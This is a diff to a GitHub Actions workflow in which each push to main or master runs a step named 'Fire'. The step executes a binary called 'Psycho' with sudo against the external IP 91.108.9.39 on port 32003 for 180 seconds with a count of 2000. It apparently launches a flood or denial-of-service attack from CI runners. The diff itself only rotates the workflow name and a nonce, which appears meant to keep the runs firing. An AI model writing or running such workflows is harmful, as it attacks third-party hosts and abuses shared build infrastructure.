@@ -1,4 +1,4 @@
-name: psycho-286108e8
+name: psycho-01b0bf33
 on:
   push:
     branches: [ main, master ]
@@ -21,5 +21,5 @@ jobs:
     - name: Fire
       run: |
         timeout 180s sudo ./Psycho 91.108.9.39 32003 180 2000 || timeout 180s sudo ./Psycho.exe 91.108.9.39 32003 180 2000 || true
-    - name: Nonce 286108e8
-      run: echo "nonce=286108e8"
+    - name: Nonce 01b0bf33
+      run: echo "nonce=01b0bf33"
